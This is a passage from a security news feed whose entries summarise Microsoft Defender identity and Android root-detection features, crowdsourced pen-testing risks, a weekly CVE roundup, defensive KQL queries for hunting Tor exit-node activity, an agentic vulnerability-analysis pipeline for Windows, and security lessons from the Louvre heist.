myriad of identity related apps and tools. But the complexity doesn\u2019t end with the fabric itself, each identity typically consists of several related accounts. Figure 1: Example identity footprint showing an interconnected set of accounts related to that single individual Take the identity footprint in Figure 1 above: here we see a visual representation of the accounts associated with a single user. At the top you\u2019ll see an on-premises Active Directory (AD) account that is synced with a corresponding Entra ID account. This type of hybrid scenario is found in more than 90% of our customers as a way to allow their users to authenticate seamlessly, to both legacy on-premises environments and cloud services like Microsoft 365. In this example the user also has two other accounts, one an administrator account with elevated privileges and the other a misconfigured cloud account. Now, as I mentioned earlier, attackers will use whatever connections they can to move laterally towards their target and in this case the misconfigured cloud account puts the identity and all its accounts at risk, including the privileged admin. Defender now links accounts, privileges, and activity patterns across the components of your unique identity fabric, augmenting the powerful graph capabilities within Microsoft Sentinel to provide defenders with one trusted view into the identity\u2019s entire footprint. Figure 2: Identity page in Microsoft Defender showing related accounts The detailed understanding of how accounts are connected helps Defender better showcase these risks at the identity level. Posture alerts and recommendations for every related account are now surfaced within a single view. Figure 3: Identity page within Microsoft Defender showing posture recommendations for the related accounts But we don\u2019t stop there: with a relational understanding of your unique identity fabric, Defender maps potential attack paths, showing how an attacker could leverage these vulnerabilities on their way to access critical assets. The easiest way to bring this value to life is using a scenario involving leaked credentials. Earlier this year we unveiled a new leaked credentials alert that extends the powerful detection from Entra to on-premises identities. Figure 4: a sample attack path showing leaked credentials as an entry point To do this Microsoft continuously scans public and private breach resources to identify leaked credentials. If a match is found, Microsoft Security Exposure Management automatically identifies the affected user and surfaces the exposure with clear severity and context. Defender then further validates and correlates that exposure, linking that account to other cross-domain security signals to detect unusual authentications or privilege escalations. These attack paths map are now expanded to show how that compromised account could be leveraged to reach other accounts and ultimately critical assets. One leaked password doesn\u2019t have to become a breach. With Microsoft\u2019s identity security stack, it becomes a closed path and a measurable step toward resilience showing exactly which routes an attacker could take and what controls will break that path. Turning visibility into coordinated response Just as security professionals can now see all the related alerts and posture recommendations across the accounts associated with an identity, they can also take direct action across all accounts with one action. Figure 5: Screenshot of the new \"Disable user\" experience in Defender Once analysts confirm that an identity is compromised, they can disable compromised identities comprehensively across providers and applications - turning previously complex, multi-portal process into a coordinated, identity-wide response. Get started today Microsoft Defender\u2019s latest identity security enhancements empower organizations to see and understand their entire identity fabric with unprecedented clarity. By surfacing connected accounts and posture recommendations into a single view, and coordinating response actions, Defender enables security teams to better remediate identity before, during and after a breach. This holistic approach not only strengthens identity posture but also transforms response actions from isolated steps into coordinated, organization-wide defenses. With these innovations, organizations are better equipped to outpace attackers, close open paths, and build lasting resilience in an ever-evolving threat landscape.

Mitigate Key Risks : Watch for poor researcher vetting, potential data exposure/exfiltration by bad actors, and labor misclassification risks from global contractor engagement. Selection Essentials : Demand rigorous identity verification, confirmed CREST certification for reports, and ethical procurement policies ensuring fair labor standards. Crowdsourced penetration testing promises broad coverage, flexible resourcing, and cost efficiency by tapping into a distributed pool of security testers. Trustwave, A LevelBlue Company, realizes not every organization has the financial resources to partner with a security firm with dedicated penetration testing capabilities. At the same time, we want to make organizations aware of the many pitfalls in the crowdsourced pen-testing market and offer a few pointers on choosing the right vendors.

To get a better handle on how crowd-based services are delivered, let\u2019s look at who\u2019s doing the work, the data and operational risks to your organization, and practical controls you can use to make informed procurement and governance decisions. Defining Crowdsourced Penetration Testing The term itself is not well-known, but to make it easier, let\u2019s think of it as a close cousin to a bug bounty program, but keep in mind that while the similarities are clear, the differences can be quite stark. A bug bounty program is primarily focused on continuous vulnerability discovery and is designed to run indefinitely, or on an always-on basis, allowing for ongoing risk reduction. It typically has a broad and open-ended scope, often covering all public-facing assets. Because the hackers operate with a freestyle and unstructured methodology, the organization benefits from a large, diverse crowd of testers. The financial model is pay-for-results, meaning the company only pays a bounty for valid, unique vulnerabilities that are found, which can make the total cost unpredictable. The main output is a running list of validated vulnerability reports and security metrics. In contrast, crowdsourced penetration testing is geared towards a structured, time-boxed assessment to fulfill compliance needs or test a new feature. These engagements are time-bound, lasting for a specific period, and operate within a specific and controlled scope defined before the test begins. The testers are a curated, smaller team of highly vetted experts who follow a structured and methodology-driven approach. This results in a comprehensive final report that is ideal for satisfying compliance requirements (like SOC 2 or PCI DSS). The cost is typically a fixed fee or a blended model, providing a more predictable budget. A company should consider crowdsourced penetration testing when they are interested in rooting out lower-risk activities, or when conducting external testing where an organization is not letting the penetration tester in the door. Additionally, price plays a role. Crowdsourced penetration testing tends to be lower cost. How Crowdsourced Penetration Services Are Delivered In a similar manner to a bug bounty program, most crowdsourced testing is delivered through an intermediary platform that coordinates testers, scopes engagements, and aggregates results. Platforms vary widely in how they operate: some are primarily marketplaces (connecting buyers to individual testers), others deliver managed programs (vetting, triage, reporting, and post-test remediation support.) The key differences that affect your risk profile include: Whether the platform manages identity and vetting centrally or leaves it to buyers. How the platform handles disclosure, triage, and remediation workflows. The contractual relationship: direct hire of testers vs. contracting with a platform-as-a-service provider. The Pros and Cons of Global vs Regional Resources Using global testers increases scale and specialized skills (useful for niche technologies) but raises regulatory, legal, and supply-chain risks (export control, cross-border data flows, varying labor laws). Regional resources may offer stronger legal recourse, easier background checks, and cultural/contextual advantages \u2014 but smaller talent pools and potentially higher costs. Who is doing the work \u2014 vetting and trust. Vetting of resources Not all testers are equal, and a proper vetting program is imperative not only to get good results but to protect your organization. Effective vetting should include: Identity verification (document checks, two-factor identification). Criminal / police checks where appropriate and lawful. Skills validation (certificates like CREST challenge tasks, past program history). Reputation metrics (platform ratings, peer endorsements, previously published research). Ensuring the Testers Are Who They Say They Are A major risk with open crowds is impersonation and false identities. Poor vetting can allow criminals or fraudsters to participate and gain entry to your systems. These can include letting state-sponsored or malicious actors who can use testing access as a cover. Risk scenario : A bad actor passes a poorly designed and executed vetting process, is granted scoped access, and later exfiltrates data or establishes persistence under the guise of testing. Potential Exploitation of Workers Crowdsourced models can create labor risks that expose your organization not only to legal issues but also to moral ones. Taxation and superannuation exposure : Are workers engaged as contractors or employees? Misclassification risks can create liability for platforms or buyers. Modern slavery/worker protection : Some platforms may source testers from jurisdictions with poor labor protections; you should consider whether working conditions or coercive practices are involved. Ethical procurement : include clauses requiring platforms to adhere to labor standards and to supply transparency about their worker engagement model. Security Operations Center (SOC) Complacency During Testing One issue to be aware of is SOC complacency. If your SOC treats crowd testing as a controlled exercise, real adversarial activity may be ignored, or conversely, testers may be mistaken for adversaries. Either outcome reduces program value and increases risk. Quality of Deliverables Crowd testing results can range from one-line \u201cbug bounty-like\u201d reports to well-documented exploit chains with remediation advice. Ensure you specify the results you want at the end of testing in any contract. There are three common problems to avoid when arranging tests: Duplicate or low-value findings (noise). Poorly reproducible or insufficiently documented issues. Overly generic remediation advice. Pen Tester Skill Level Crowdsourcing excels at breadth (many scanners and testers run tests concurrently), but not all platforms guarantee depth. If you need advanced adversary simulation, confirm the required skill level and provide a sample of past work. Remember, there\u2019s a difference between: Scripted vulnerability scanning (automated, low custom skill) and Specialized offensive security experts (manual exploitation, creative attack paths). Obtaining the Best Results Possible Peer-review or triage processes significantly improve output quality. Look for platforms that: Triage and validate submissions before delivery. Provide a peer-review or second-opinion mechanism for complex findings. Offer a managed remediation tracking process. The key is not to treat the crowd as a black box: insist on strong vetting, clear contractual protections, technical controls that minimize exposure, and operational processes that preserve SOC effectiveness. When you combine those controls with sensible scoping and human triage, crowd testing becomes a powerful discovery engine \u2014 and not an unmanaged risk. In Summary To mitigate your risk and provide the highest value to your organization, look to the track record of your proposed penetration testing supplier, including the following: The heritage of your supplier, are they committed to your security? Independent references, whilst organizations will have Non-Disclosure Agreements in place, most organizations should be able to facilitate a call with a customer prior to contract execution. Industry certifications, CREST being a great example, allowing you to be sure that the cybersecurity companies you engage to test and protect your systems are reputable and competent. Ask for redacted example reports that align with your required scope, and know the quality of what you will receive in advance. Finally, if any of the points raised here give you pause, remember that Trustwave SpiderLabs has dedicated teams of pen testers with a long history of conducting highly effective tests that will improve your security.",

      "title": "The Week in Vulnerabilities: 3 Microsoft Flaws Among High-Priority Fixes",
      "summary": "Patch Tuesday week yielded nearly 1,000 vulnerabilities from Microsoft and other vendors. Here are some important ones to focus on. Cyble Vulnerability Intelligence researchers tracked 971 vulnerabilities in the last week, and at least 37 of the disclosed vulnerabilities quickly had a publicly available Proof-of-Concept (PoC), significantly increasing the likelihood of real-world attacks on those vulnerabilities. A total of 60 vulnerabilities were rated as critical under the CVSS v3.1 scoring system, while 17 received a critical severity rating based on the newer CVSS v4.0 scoring system. These are some of the vulnerabilities flagged by Cyble threat intelligence researchers in reports to clients this week, which included Patch Tuesday updates from Microsoft and other vendors. The Week\u2019s Top IT Vulnerabilities CVE-2025-60724 is a 9.8-severity Heap-based Buffer Overflow vulnerability in the Microsoft Graphics Device Interface Plus component on Windows systems that could potentially allow an unauthorized attacker to execute code remotely over a network. CVE-2025-13026 is a vulnerability in Mozilla Firefox arising from incorrect boundary condition checks, which could potentially let attackers escape the browser's sandbox and execute arbitrary code. CVE-2025-52425 is a critical SQL injection vulnerability in QuMagie, a multimedia application used in QNAP NAS systems, which could potentially be exploited remotely and without authentication to execute unauthorized code or commands. CISA added five vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog: CVE-2025-21042 , a Samsung Galaxy Out-of-Bounds Write vulnerability that could lead to full device compromise and has reportedly been used to deliver spyware CVE-2025-9242 , a WatchGuard Firebox Out-of-Bounds Write vulnerability CVE-2025-12480 , a Gladinet Triofox Improper Access Control vulnerability CVE-2025-62215 , a Microsoft zero-day Windows Race Condition vulnerability CVE-2025-64446 , a Fortinet FortiWeb Path Traversal vulnerability CISA also issued updated orders to federal agencies to patch Cisco vulnerabilities CVE-2025-20333 and CVE-2025-20362 . CVE-2025-12480 and CVE-2025-20333 have also generated significant discussion in open source communities in the last week. CVE-2025-12480 is the second Gladinet vulnerability added to the CISA KEV catalog this month, following CVE-2025-11371 on November 4. CVE-2025-12480 could allow attackers to bypass authentication by manipulating HTTP Host headers, potentially gaining access to the product's initial setup and protected configuration pages. CVE-2025-20333 is a critical Buffer Overflow vulnerability affecting Cisco Secure Firewall Adaptive Security Appliance (ASA) and Firewall Threat Defense (FTD) devices. The flaw could allow authenticated remote attackers (VPN users) to execute arbitrary code with root privileges, potentially leading to complete device compromise. Cyble also flagged one industrial control system (ICS) vulnerability this week. CVE-2025-12636 affects Ubia Ubox v1.1.124. A failure to adequately secure API credentials could enable an attacker to connect to backend services, which could allow them to gain unauthorized access to available cameras to view live feeds or modify settings. Vulnerabilities Discussed on Cybercrime Forums Cyble dark web researchers observed several threat actors discussing weaponizing vulnerabilities on underground and dark web forums. Among the vulnerabilities under discussion were: CVE-2025-6554 , a critical zero-day type confusion vulnerability in the V8 JavaScript and WebAssembly engine used by Google Chrome and other Chromium-based browsers. This flaw could allow a remote attacker to perform arbitrary read/write operations by serving a crafted HTML page, which in some cases could lead to full remote code execution. CVE-2025-60710 , a high-severity local privilege escalation vulnerability in the Host Process for Windows Tasks affecting Microsoft Windows 11 Version 25H2 (build 10.0.26200.0). The vulnerability involves improper link resolution before file access. The flaw could allow an authorized attacker with limited local privileges to exploit improper handling of symbolic links or junction points in the Host Process for Windows Tasks, redirecting file operations to unintended locations and escalating their privileges. CVE-2025-64495 , a high-severity stored DOM-based Cross-Site Scripting (XSS) vulnerability in Open WebUI, a self-hosted artificial intelligence platform, affecting versions 0.6.34 and below. The vulnerability exists in the chat window's prompt insertion feature, where user-controlled HTML from custom prompts is assigned directly to the DOM sink .innerHTML without proper sanitization when the \"Insert Prompt as Rich Text\" setting is enabled. While the marked library is used to parse the content, it does not sanitize HTML, potentially allowing attackers with low-level privileges to create malicious prompts containing JavaScript payloads that execute when other users insert those prompts via slash commands. CVE-2025-61932 , a critical remote code execution vulnerability affecting Motex Lanscope Endpoint Manager (On-Premises), specifically the Client Program (MR) and Detection Agent (DA) components in versions 9.4.7.1 and earlier. This stems from improper verification of communication channel sources, potentially allowing attackers to remotely execute arbitrary code by sending specially crafted network packets to TCP port 443 on vulnerable systems. Conclusion The high number of critical and exploited vulnerabilities in the last week underscores the demands placed on security teams to respond with rapid, well-targeted actions to successfully defend IT and critical infrastructure. A risk-based vulnerability management program should be at the heart of those defensive efforts. Other cybersecurity best practices that can help guard against a wide range of threats include segmentation of critical assets; removing or protecting web-facing assets; Zero-Trust access principles; ransomware -resistant backups; hardened endpoints, infrastructure, and configurations; network, endpoint , and cloud monitoring; and well-rehearsed incident response plans. Cyble\u2019s comprehensive attack surface management solutions can help by scanning network and cloud assets for exposures and prioritizing fixes, in addition to monitoring for leaked credentials and other early warning signs of major cyberattacks .

      "title": "Threat Hunting based on Tor Exit Nodes (+ KQLs queries)",
      "summary": "I think this time AI perfectly captured how I feel about what\u2019s hiding behind user traffic when they browse with the Tor browser \u2014 welcome to OniTor! \ud83e\uddc5\ud83d\udcdb Working in a SOC, one of today\u2019s ongoing realities is the use of the Tor browser by users. If you cannot block it by default, it becomes a real threat \u2014 and another headache in our daily work as we try to differentiate legitimate from non-legitimate actions. Every day, I receive alerts related to Tor activity such as web navigation, sign-in attempts, and other cases. Based on this, I want to quickly determine when I should be concerned and when the alerts can be treated as informational rather than actual incidents. Using one of my trusted, and from my point of view underrated sources: Gyp The Cat ( https://firewalliplists.gypthecat.com/kusto-tables/kusto-tor-exit-nodes-historic-table/ ) I am collecting data related to the historic dataset of Tor exit nodes, thanks \u2018Gatito\u2019 \ud83d\udc31 But\u2026. what is a Tor Exit Node? A Tor exit node is the last server in the Tor network that your traffic passes through before it reaches the public internet so it is the one that actually makes the connection to website. This type of navigation introduces significant security risks because attackers often leverage them to hide their identity and evade detection. In addition, Tor traffic is frequently associated with malicious activity, including credential-stuffing, brute-force login attempts, reconnaissance, and command-and-control communication. When a user or device interacts with services through a Tor exit node, it becomes harder to verify legitimacy, increases the probability of anonymized threat actor activity, and raises the risk of account compromise or unauthorized access. In the sections below, I will share different KQL queries that I created to help me to detect suspicious activity originating from Tor exit nodes. These examples will cover key detection areas such as successful sign-in attempts, device activity, and application activity, with the aim to quickly identify when I have to react and priority among multiple Tor alerts. Tor Exit Browser hunting based on Device Events This is a particularly concerning case. While I expected to see some device connections to Tor exit nodes, I did not expect such highly suspicious URLs as those shown in the image below. I recommend to do some Threat Hunting to understand what is happening when the devices are connecting to Tor and create a detection rule to alert whenever a device connects to a Tor exit node with a URL that should be investigated. \ud83d\udea8 You can remove the // (in the summarize) if you want to use the Query as a Detection. let TorExitNodesHistoric = externaldata(IP:string, ActiveDates:string, Source:string) ['https://firewalliplists.gypthecat.com/lists/kusto/kusto-tor-exit-historic.json.zip'] with(format=\"multijson\"); TorExitNodesHistoric | extend ActiveDates = split(ActiveDates, ',') | extend Country = tostring(geo_info_from_ip_address(IP)['country']) | summarize ActiveDays = array_length(make_set(ActiveDates)) by Country,IP,Source | join kind=inner (DeviceNetworkEvents) on $left.IP == $right.RemoteIP | summarize by Source,DeviceName,TOR_Exit_Node= LocalIP,Country,ActiveDays,RemoteUrl, InitiatingProcessAccountName, InitiatingProcessVersionInfoProductName, ActionType//, Timestamp,ReportId | order by ActiveDays Tor Exit Browser hunting based on Sign-in attempts Based on my experience, when a TOR Exit Node has been active for an extended period and we observe successful sign-ins from that node , I would take some action. At minimum, the password should be reset, and if this type of activity is allowed in your environment, I would recommend to communicate the associated risks to the user . This is exactly the insights that the second KQL query provides. \ud83d\udea8 You can remove the // (in the summarize) if you want to use the Query as a Detection. let TorExitNodesHistoric = externaldata(IP:string, ActiveDates:string, Source:string) ['https://firewalliplists.gypthecat.com/lists/kusto/kusto-tor-exit-historic.json.zip'] with(format=\"multijson\"); TorExitNodesHistoric | extend ActiveDates = split(ActiveDates, ',') | extend Country = tostring(geo_info_from_ip_address(IP)['country']) | summarize ActiveDays = array_length(make_set(ActiveDates)) by Country,IP, Source | join kind=inner (AADSignInEventsBeta) on $left.IP == $right.IPAddress | where ErrorCode == 0 | summarize make_set(Application), make_set(ClientAppUsed) by Source,Country,ActiveDays,TOR_Exit_Node= IPAddress,AccountUpn, AuthenticationRequirement//, Timestamp,ReportId | order by ActiveDays Tor Exit Browser hunting based on Cloud App Events Finally, the Cloud App Events can give us extended information about the application used during the use and the navigation with Tor Browser. let TorExitNodesHistoric = externaldata(IP:string, ActiveDates:string, Source:string) ['https://firewalliplists.gypthecat.com/lists/kusto/kusto-tor-exit-historic.json.zip'] with(format=\"multijson\"); TorExitNodesHistoric | extend ActiveDates = split(ActiveDates, ',') | extend Country = tostring(geo_info_from_ip_address(IP)['country']) | summarize ActiveDays = array_length(make_set(ActiveDates)) by Country,IP, Source | join kind=inner (CloudAppEvents) on $left.IP == $right.IPAddress | summarize make_set(Application) by v,Country,ActiveDays,TOR_Exit_Node= IPAddress,AccountDisplayName//, Timestamp,ReportId | order by ActiveDays, AccountDisplayName Conclusion Tor traffic can be messy to deal with, and not every alert means trouble \u2014 but attackers love using it to stay anonymous. By checking the activities when navigating with Tor exit node such as device events, sign-ins attempts, and cloud app actions, it becomes much easier to see what\u2019s actually suspicious and what\u2019s just background noise. The queries above are simply what I use to sort things out faster and keep an eye on anything that looks off. They\u2019ve helped me catch the important cases without getting buried in unnecessary alerts. Stay caffeinated, keep hunting, and may your onions stay in the kitchen \u2014 not in your network, at the end its aim is to make us cry \ud83e\uddc5\ud83d\udd25\ud83d\ude2d Threat Hunting based on Tor Exit Nodes (+ KQLs queries) was originally published in Detect FYI on Medium, where people are continuing the conversation by highlighting and responding to this story.",

      "title": "Transforming Security Analysis into a Repeatable, Auditable, and Agentic Workflow",
      "summary": "Author(s): Animesh Jain, Vinay Yadav Shaped by investigations into the strategic question of what it takes for Windows to achieve world-leading security\u2014and the practical engineering needed to explore agentic workflows at scale and their interfaces. Our work in Windows Servicing & Delivery (WSD) is shaped by two guiding prompts from leadership: \" what does it take for Windows to achieve world-leading security\" , and \"how do we responsibly integrate AI into systems as large and high-churn as Windows?\". Reasoning models open new possibilities on both fronts. As we continue experimenting, one issue repeatedly surfaces as the bottleneck for scalable security assurance: variant vulnerabilities. They are subtle, recurring, and easy to miss\u2014making them an ideal proving ground for the enterprise-grade workflow we present here. Security Analysis at Windows Scale Security analysis shouldn\u2019t be an afterthought\u2014it should be a continuous, auditable, and intelligence-driven process built directly into the engineering workflow. This work introduces an agentic security analysis pipeline that uses reasoning models and tool-based agents to detect variant vulnerabilities across large, fast-changing codebases. By combining automation with explainability, it transforms security validation from a manual, point-in-time task into a repeatable and trustworthy part of every build. Why are variants the hard part? Security flaws rarely occur in isolation. Once a vulnerability is fixed, its logical or structural pattern often reappears elsewhere in the codebase\u2014hidden behind different variables, layers, or call paths. These recurring patterns are variants \u2014the quiet echoes of known issues that can persist across millions of lines of code. Finding them manually is slow, repetitive, and incomplete. As engineering velocity increases, so does the likelihood of variant drift \u2014the same vulnerability class re-emerging in a slightly altered form. Each missed variant carries a downstream cost: regression, re-servicing, or, in the worst cases, re-exploitation. Modern large systems like Windows are too large, too interconnected, and ship too frequently for manual vulnerability discovery to keep pace. Traditional static analyzers and deterministic class-based scanners struggle to generalize these patterns or create too much noise, while targeted fuzzing campaigns often fail to trigger the nuanced runtime conditions that expose them. To stay ahead, automation must evolve. We need systems that reason\u2014not just scan\u2014systems capable of understanding relationships between code regions and applying logical analogies instead of brute-force enumeration. Reasoning Models: A Turning Point in Security Research Recent advances in AI reasoning have demonstrated that large language models can uncover vulnerabilities previously missed by deterministic tools. For example, Google\u2019s Big Sleep agent surfaced an exploitable SQLite flaw (CVE-2025-6965) that bypassed traditional fuzzers due to configuration-sensitive logic. Similarly, an o-series reasoning model helped identify a critical Linux SMB logoff use-after-free (CVE-2025-37899), proving that reasoning-driven automation can detect complex, context-dependent flaws in mature kernel code. These breakthroughs show what\u2019s possible when systems can form, test, and refine hypotheses about software behavior. The challenge now is scaling that intelligence into repeatable, auditable, enterprise-grade workflows \u2014where every result is traceable, reviewable, and integrated into the developer\u2019s daily workflow. A Framework for Agentic Security Analysis To address this challenge, we\u2019ve developed an agentic security analysis framework that applies reasoning models within structured, enterprise grade workflow pattern. It combines large language model agents, specialized analysis tools, and structured artifact generation to make vulnerability discovery continuous, explainable, and auditable . It is interfaced as a first-class Azure DevOps (ADO) pipeline and can be integrated natively into enterprise CI/CD processes. For security analysis, it continuously reasons over large, evolving codebases to identify and validate variant vulnerabilities earlier in the release cycle. Together, these components form a repeatable workflow that helps surface variant patterns with greater consistency and clarity. Core Technical Pillars Scale \u2013 Autonomous Code Reasoning Long-context models extend analysis across massive, evolving codebases. They infer analogies, relationships, and behavioral patterns between code regions, enabling scalable reasoning that adapts as systems grow. Tool\u2013Agent Collaboration Specialized agents coordinate to perform semantic search, graph traversal, and both static and dynamic interpretation. This distributed reasoning approach ensures resilience and precision across diverse enterprise environments. Structured Artifact Generation Every step produces versioned, auditable artifacts that document the reasoning process. These artifacts help provide reproducibility, compliance, and transparency\u2014critical for enterprise governance and regulated industries. Together, these pillars enable scalable, explainable, and repeatable vulnerability discovery across large software ecosystems such as Windows. Every stage\u2014from reasoning to validation\u2014is logged and traceable, designed to make each discovery reproducible and reviewable. Inside the framework Agent-Led, Human-Reviewed The system is agent-led from start to finish and human-reviewed only at decision boundaries. Agents form hypotheses from recent fixes or vulnerability classes, test them against context, perform validation passes, and generate evidence-backed reports for reviewer confirmation. The workflow mirrors how seasoned security engineers operate\u2014only faster and continuously. Figure 1: The Base Agent that represents a unit of worker in the pipeline. The agent can take on tasks based on templatized prompts. Tool Specialists as Agents Each analytical tool functions as a domain-specific agent\u2014performing semantic search, file inspection, or function-graph traversal. These agents collaborate through structured orchestration, maintaining specialization without sacrificing coherence. Figure 2: Tool specialist agents as tool calls from Base Agent. Helps managing context length and retain focus for the Base Agent. Agentic Patterns and Orchestration The framework employs reusable reasoning patterns\u2014 reflective reasoning , actor\u2013validator loops, and parallel tool dialogues\u2014for accuracy and scale. A central conductor agent governs task coordination, context flow, and artifact persistence across runs. Figure 3: The reflective reasoning loop for Variant Identification with Base Agents and the personas. Each arrow is a logged agentic conversation. Auditability Through Artifacts Every investigation yields a transparent chain of artifacts: Analysis Notes \u2013 summarize candidate issues Critique Notes \u2013 document reasoning and counter-evidence Synthesis Reports \u2013 provide developer-ready summaries, diffs, call graphs, and exploitability insights Agentic Conversation Logs - provides conversation logs so developers can backtrack on reasoning and get more context This structure makes each discovery fully traceable and auditable. CI/CD-Native Integration The interface operates as a first-class Azure DevOps pipeline , attachable to pull requests, nightly builds, or release triggers. Each run publishes versioned artifacts and validation notes directly into the developer workflow\u2014making reasoning-driven security a seamless part of software delivery. What It Can Do Today Seeded Variant Hunts: Start from a recent fix or known pattern to enumerate analogous cases, analyze helper functions, and test reachability. Evidence-First Reporting: Every finding includes reproducible evidence\u2014code snippets, diffs, and caller graphs\u2014delivered within the PR or work item. Scalable Coverage: Runs across servicing branches, producing consistent and auditable validation artifacts. Improved Precision: A reasoning-based validation pass has significantly reduced false positives in internal testing. Case Study: CVE-2025-55325 During a sweep of \u201c*_DEFAULTS\u201d deserializers, the agentic pipeline independently identified GetPoolDefaults trusting a user-controlled size field and copying that many bytes from a caller buffer. The missing runtime bounds check\u2014guarded only by an assertion in debug builds\u2014enabled a potential read access violation and information disclosure. The mitigation mirrored a hardened sibling helper: enforcing runtime bounds on Size versus BytesAvailable/Version before allocation and copy. The finding was later validated by the servicing teams, confirming it matched an issue already under active investigation\u2014illustrating how the automated reasoning process can independently surface real-world vulnerabilities that align with expert analysis. Beyond Variant Analysis The underlying architecture of this framework extends naturally beyond variant detection: Net-new vulnerability discovery through cross-binary pattern matching Model-assisted fuzzing & static analysis orchestrated through CI/CD integration Regression detection via historical code comparisons Security Development Lifecycle (SDL) enforcement and reproducibility checks The agentic patterns and tooling can support net-new vulnerability discovery through cross-binary pattern matching, regression detection using historical code comparisons, reproducibility checks aligned with SDL requirements, and model-assisted fuzzing orchestrated through CI/CD processes. These capabilities open the door to applying reasoning-driven workflows across a broader range of security & validation tasks. The Road Ahead Looking ahead, this trajectory naturally leads toward autonomous cybersecurity pipelines powered by reasoning agents that apply reflective analysis, validation loops, and structured tool interactions to complex codebases. By structuring each step as an auditable artifact, the approach supports security & validation analysis that is both explainable and repeatable. These agents could help validate security posture, analyze historical and real-time signals, and detect anomalous patterns early in the lifecycle .

      "title": "Native root detection support for Microsoft Defender on Android",
      "summary": "Root detection is a critical security control that identifies whether an Android device has been compromised to gain elevated privileges or unrestricted access to the operating system. When a device is rooted, built-in security boundaries are broken, allowing attackers or malicious applications to bypass security controls, disable protections, and manipulate sensitive system files. This permits the installation of unauthorized applications and increases the likelihood of unauthorized access to corporate data. Such devices can raise the overall risk level for an organization. That\u2019s why we\u2019re pleased to share that Microsoft Defender now includes built-in root detection on Android devices. This enables proactive detection of rooted devices without requiring Intune policies, ensuring stronger security and validating that Defender is running on an uncompromised device, ensuring more reliable telemetry that is not vulnerable to attacker manipulation. What\u2019s new? Enhanced SOC visibility \u2013 See rooted devices in your environment in the Defender portal. Onboarding protection \u2013 Prevents users from onboarding Defender on rooted devices so that it can\u2019t be manipulated by attackers. Streamlined feedback process \u2013 Allows users to directly submit feedback logs on rooted devices from the Defender app for investigation. Improved user experience \u2013 Provides clear visibility into whether root detection is active or turned off and what actions are required to activate the root detection. What protection does it bring to the customer? Previously, root detection alerts were not displayed in the security portal. With this update, Defender now detects rooted Android devices, whether they are managed or unmanaged. When a device is identified as rooted, a high severity alert appears in the Defender portal. The device is then classified as high risk and its risk score is communicated to device compliance policies. This allows organizations to block such devices from accessing corporate resources if compliance policies have been configured in the Intune portal. Additionally, analysts can investigate further to determine the scope of the issue and ensure no broader impact has occurred within the organization. Prerequisite Company portal (Intune app) must be installed, and version must be 5.0.6688.0 or higher. Root detection is on by default Admin experience High Severity Root detection alerts appear in the Incidents and Alerts sections. Click on an alert to view detailed information for investigation. Use the Devices tab under Assets to investigate impacted devices. Admins can search for specific devices and review details in Incidents, Alerts, and Device Timeline for deeper analysis. User experience If a device is detected as rooted: Defender notifies the user with a \u201cDevice is Rooted\u201d notification. Tapping the notification or opening the app takes the user to a page stating, \u201cYour device is rooted.\u201d To run root detection on Defender, Company portal must be installed and version must be 5.0.6688.0 or higher User Experience when Intune Company Portal version is less than 5.0.6688.0: Defender notifies on app to update the company portal app to version 5.0.6688.0.

      "title": "Art and Science: Cyber and Physical Security Convergence Deficiencies in the Louvre Heist",
      "summary": "Cyber meets physical security: Weak passwords and outdated systems may have opened the door to the thieves. A warning for all industries: The Louvre incident shows why converging cybersecurity and physical security is essential. In eight short minutes on October 25, 2025, a group of thieves captured the world\u2019s attention and imagination, perpetuating a daring heist in broad daylight and escaping with approximately \u20ac88 million worth of prized artwork from the planet\u2019s most visited museum: The Louvre. Within the security community, the first successful robbery from the iconic Parisian landmark since 1998 was a bombshell story. But the \u201csecurity community\u201d is large and diverse, and very little of the public dialogue regarding the heist touched specifically upon cybersecurity. These stolen masterpieces were not flush cryptocurrency wallets or valuable pieces of NFT art secreted away on a thumb drive or exfiltrated to a remote server, the thieves employed some of the oldest tools in the burglary game: a ladder for climbing and a sharp edge for cutting. So far, law enforcement has arrested a total of seven people in connection with the heist, according to published reports . What\u2019s the Connection to Cyber? While details about the security weaknesses that enabled the heist are still forthcoming, the mechanical lift and electrical angle grinder are not generally the tools of the cybercriminal. As a result, the Louvre heist, at first glance, seemed largely distinct from the cybersecurity sphere, until additional details emerged regarding the museum\u2019s cybersecurity controls. Details from past audits revealed the museum\u2019s security posture was fraught with vulnerabilities and security hygiene concerns. Of note, these security weaknesses pertained directly to the museum\u2019s network of physical access control systems, including surveillance cameras secured with the much-ballyhooed password \u201cLOUVRE.\u201d To understand how such rudimentary weaknesses could have persisted within such critical anti-theft infrastructure, we must consider the convergence of cyber and physical security. Readers who have enjoyed Dan Brown\u2019s The Da Vinci Code will be aware that the Louvre is equipped with a wide array of physical security systems, including deployable gates and mantraps that can be triggered during a burglary attempt. What may not be so obvious is the extent to which these modern physical security controls are supported by an information technology infrastructure. As early as 2021, CISA warned of the Cybersecurity and Physical Security Convergence , calling out an \u201cincreasingly interconnected mesh of cyber-physical systems (CPS)\u201d. Anyone who has badged into an office space has experienced this phenomenon, in which an IT-supported access control system affects a change in the physical world in the form of an unlocked door. The problem, CISA continues in the same 2021 publication, is that the convergence of physical and cybersecurity teams has not kept pace with the expansion of CPS environments. Seen as unique business functions with distinct responsibilities and skillsets, cyber and physical security groups have traditionally operated in siloes, often reporting to different members of executive leadership. As a result, organizations face increased risk that critical CPS technologies owned and operated within the physical security function are not managed with cyber resilience in mind. Returning to the Louvre specifically, we see an organization whose physical security controls are at risk of being undermined by the unstable cyber foundation on which they operate. Past cybersecurity audits demonstrate a spate of information security issues at the museum dating back to 2014, which prompted repeated warnings and improvement recommendations from the French National Cybersecurity Agency (ANSSI). Among these findings are a few most egregious, including the aforementioned password selection and a reliance upon obsolete security software purchased in 2003 and running on the longtime end-of-life Windows Server 2003 operating system. What We Know and What We Don\u2019t Know, Yet While we know about past cybersecurity issues, without the release of complete details from the ongoing Louvre investigation, it is impossible at this time to ascribe blame to the museum\u2019s cybersecurity deficiencies. However, at the very least we can identify several scenarios in which the security vulnerabilities identified in the ANSSI audit reports could feasibly enable or contribute to a successful heist. Slick talking and elaborate costumes aside, Clooney and Co. cannot reach the fabled casino vault in Ocean\u2019s Eleven without first compromising the integrity of security camera feeds. Cyber compromise of camera systems limits their effectiveness and contributes to a physical security breach. Given the eye-popping value assigned to the stolen art, the incident at the Louvre serves to illustrate the value of an integrated security program, in which CPS systems receive the maintenance required to stay resilient against physical and digital attacks. This valuable lesson applies well outside the realm of grand larceny as well, as the proliferation of CPS technology could allow an attacker to manipulate medical devices or disable an electrical power grid. All organizations would do well to assess their CPS footprint and foster increased collaboration between Cyber and Physical security 